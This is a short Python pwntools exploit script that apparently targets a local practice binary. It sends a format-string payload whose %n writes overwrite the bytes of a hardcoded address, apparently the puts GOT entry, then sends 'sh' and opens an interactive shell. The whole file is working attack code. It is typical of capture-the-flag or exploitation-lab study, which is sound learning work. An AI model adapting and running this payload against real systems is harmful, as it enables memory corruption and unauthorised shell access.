#!/bin/python3

from pwn import *
import sys

puts_addr = 0x804bff0

if len(sys.argv)==1:
    app_path = "./app1.o"
    puts_addr = 0x804b2cc
else:
    app_path=sys.argv[1]

io = process(app_path)
gdb.attach(io)
io.readuntil("Please enter your name: \n")

payload = b""
payload += b"%64p%15$n%80p%16$n%80p%17$n%23p%18$n"
#payload += b"%15$x%16$x%17$x%18$xAAAAAAAAAAAAAAAA"
payload += p32(puts_addr)
payload += p32(puts_addr + 1)
payload += p32(puts_addr + 2)
payload += p32(puts_addr + 3)

io.sendline(payload)
io.sendline(b"sh\x00\x00")
io.interactive()
